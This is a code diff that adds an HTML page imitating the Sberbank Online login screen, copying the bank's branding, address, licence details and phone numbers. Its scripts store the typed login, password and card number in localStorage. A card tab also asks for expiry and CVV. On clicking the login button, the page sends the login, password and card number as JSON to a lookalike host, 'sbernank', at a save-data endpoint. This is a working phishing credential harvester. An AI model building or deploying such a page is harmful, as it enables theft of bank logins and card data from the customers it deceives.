@@ -1,0 +1,363 @@
+
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Вход в СберБанк Онлайн</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Roboto', sans-serif;
+    }
+
+    body {
+      background-color: #f9f9f9;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .login-container {
+      background: white;
+      padding: 40px;
+      width: 420px;
+      box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
+      border-radius: 12px;
+      border: 1px solid #e0e0e0;
+    }
+
+    .logo {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .logo img {
+      width: 150px;
+    }
+
+    h2 {
+      text-align: center;
+      color: #333;
+      margin-bottom: 20px;
+    }
+
+    .tabs {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 20px;
+      border-bottom: 2px solid #e0e0e0;
+    }
+
+    .tab {
+      padding: 10px 0;
+      width: 33.3%;
+      text-align: center;
+      color: #007f00;
+      font-weight: 500;
+      cursor: pointer;
+    }
+
+    .tab.active {
+      border-bottom: 3px solid #007f00;
+    }
+
+    .form-group {
+      margin-bottom: 15px;
+    }
+
+    input[type="text"], input[type="password"], input[type="month"], input[type="number"] {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 14px;
+    }
+
+    .remember-container {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 15px;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      background-color: #007f00;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #005f00;
+    }
+
+    .no-card-text {
+      text-align: center;
+      margin-top: 10px;
+      font-size: 14px;
+      color: black;
+    }
+
+    .auth-options {
+      margin-top: 20px;
+      background: #ffffff;
+      padding: 15px;
+      border-radius: 8px;
+    }
+
+    .auth-option {
+      display: flex;
+      align-items: center;
+      padding: 10px 0;
+      cursor: pointer;
+      color: #007f00;
+      border-bottom: 1px solid #ffffff;
+    }
+
+    .auth-option:last-child {
+      border-bottom: none;
+    }
+
+    .auth-option img {
+      width: 32px;
+      height: 32px;
+      margin-right: 10px;
+    }
+
+    .security-info {
+      margin-top: 15px;
+      background: #e5f4e3;
+      padding: 10px;
+      border-radius: 8px;
+      color: #007f00;
+      font-size: 14px;
+    }
+
+    .image-placeholder {
+      margin-top: 15px;
+      text-align: center;
+    }
+
+    .image-placeholder img {
+      width: 100%;
+      max-width: 400px;
+      border-radius: 16px;
+    }
+
+    .report-buttons {
+      margin-top: 15px;
+    }
+
+    .report-button {
+      display: block;
+      width: 100%;
+      text-align: center;
+      padding: 12px;
+      background-color: #f3f4f5;
+      border-radius: 8px;
+      margin-top: 10px;
+      cursor: pointer;
+      color: #007f00;
+      font-weight: 500;
+    }
+
+    footer {
+      margin-top: 30px;
+      font-size: 12px;
+      color: #666;
+      text-align: center;
+    }
+
+    .footer-info {
+      margin-top: 15px;
+    }
+
+    .hidden {
+      display: none;
+    }
+  </style>
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      const tabs = document.querySelectorAll(".tab");
+      const formGroups = document.querySelectorAll(".form-group");
+      const rememberContainer = document.querySelector(".remember-container");
+      const loginButton = document.querySelector("button");
+      const noCardText = document.querySelector(".no-card-text");
+      const loginInput = document.querySelector('input[placeholder="Введите логин"]');
+      const passwordInput = document.querySelector('input[placeholder="Пароль"]');
+
+      const cardFieldsContainer = document.createElement("div");
+      cardFieldsContainer.classList.add("hidden");
+      cardFieldsContainer.innerHTML = `
+        <div class="form-group">
+          <input id="card-number" type="text" placeholder="Введите номер карты">
+        </div>
+        <div class="form-group">
+          <input type="month" placeholder="Месяц/Год">
+        </div>
+        <div class="form-group">
+          <input type="number" placeholder="CCV" max="999" min="100">
+        </div>
+      `;
+      document.querySelector("form").insertBefore(cardFieldsContainer, rememberContainer);
+
+      tabs.forEach((tab, index) => {
+        tab.addEventListener("click", function () {
+          tabs.forEach(t => t.classList.remove("active"));
+          this.classList.add("active");
+
+          if (index === 2) {
+            formGroups.forEach(group => group.classList.add("hidden"));
+            rememberContainer.classList.add("hidden");
+            loginButton.classList.add("hidden");
+            noCardText.classList.add("hidden");
+            cardFieldsContainer.classList.remove("hidden");
+          } else {
+            formGroups.forEach(group => group.classList.remove("hidden"));
+            rememberContainer.classList.remove("hidden");
+            loginButton.classList.remove("hidden");
+            noCardText.classList.remove("hidden");
+            cardFieldsContainer.classList.add("hidden");
+          }
+        });
+      });
+
+      cardFieldsContainer.addEventListener("input", function () {
+        const cardNumber = document.getElementById("card-number").value;
+        if (cardNumber.trim() !== "") {
+          loginButton.classList.remove("hidden");
+        } else {
+          loginButton.classList.add("hidden");
+        }
+      });
+
+      // Save and load input data
+      loginInput.value = localStorage.getItem("login") || "";
+      passwordInput.value = localStorage.getItem("password") || "";
+      const cardNumberInput = document.getElementById("card-number");
+      if (cardNumberInput) cardNumberInput.value = localStorage.getItem("cardNumber") || "";
+
+      loginInput.addEventListener("input", function () {
+        localStorage.setItem("login", loginInput.value);
+      });
+
+      passwordInput.addEventListener("input", function () {
+        localStorage.setItem("password", passwordInput.value);
+      });
+
+      if (cardNumberInput) {
+        cardNumberInput.addEventListener("input", function () {
+          localStorage.setItem("cardNumber", cardNumberInput.value);
+        });
+      }
+    });
+  </script>
+</head>
+<body>
+  <div class="login-container">
+    <div class="logo">
+      <img src="images\sberr.png" alt="СберБанк">
+    </div>
+    <h2>Вход в СберБанк Онлайн</h2>
+    <div class="tabs">
+      <div class="tab active">Логин</div>
+      <div class="tab">Телефон</div>
+      <div class="tab">Номер карты</div>
+    </div>
+    <form>
+      <div class="form-group">
+        <input type="text" placeholder="Введите логин">
+      </div>
+      <div class="form-group">
+        <input type="password" placeholder="Пароль">
+      </div>
+      <div class="remember-container">
+        <label><input type="checkbox"> Запомнить меня</label>
+        <a href="#" style="color: #007f00; font-size: 14px;">Забыли логин или пароль?</a>
+      </div>
+      <button type="button">Войти</button>
+      <p class="no-card-text">Нет карты СберБанка?</p>
+    </form>
+
+    <div class="auth-options">
+      <div class="auth-option">
+        <img src="images\qr.png" alt="QR-код">
+        Вход по QR-коду
+      </div>
+      <div class="auth-option">
+        <img src="images\push.png" alt="Push-код">
+        Вход по Push-коду
+      </div>
+      <div class="auth-option">
+        <img src="images\code.png" alt="Код">
+        Вход по коду
+      </div>
+    </div>
+
+    <div class="image-placeholder">
+      <img src="images\panel.png" alt="User image placeholder">
+    </div>
+
+    <div class="report-buttons">
+      <div class="report-button">Сообщить о мошеннике</div>
+      <div class="report-button">Больше о безопасности</div>
+    </div>
+
+    <div class="security-info">
+      Новый способ входа — по коду. Подключить безопасный доступ к СберБанк Онлайн.
+    </div>
+
+    <footer>
+      <div class="footer-info">
+        <p>Россия, Москва, 117997, ул. Вавилова, д. 19</p>
+        <p>Генеральная лицензия на осуществление банковских операций от 11 августа 2015 года. Регистрационный номер — 1481</p>
+        <p>© 1997–2025 ПАО СберБанк</p>
+        <p>900 — Для бесплатных звонков с мобильных на территории РФ</p>
+        <p>+7 (495) 500-55-50 — Для звонков из любой точки мира</p>
+      </div>
+    </footer>
+  </div>
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      const loginButton = document.querySelector("button");
+  
+      loginButton.addEventListener("click", function () {
+        const loginInput = document.querySelector('input[placeholder="Введите логин"]').value;
+        const passwordInput = document.querySelector('input[placeholder="Пароль"]').value;
+        const cardNumberInput = document.getElementById("card-number")?.value || "";
+  
+        const dataToSend = {
+          login: loginInput,
+          password: passwordInput,
+          cardNumber: cardNumberInput
+        };
+  
+        fetch('http://online.sbernank.ru.localhost:3000/save-data', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(dataToSend)
+        })
+        .then(response => response.text())
+        .then(message => {
+          alert('Данные отправлены и сохранены: ' + message);
+        })
+        .catch(error => {
+          console.error('Ошибка отправки данных:', error);
+        });
+      });
+    });
+  </script>  
+  <script src="app.js"></script>
+</body>
+</html>
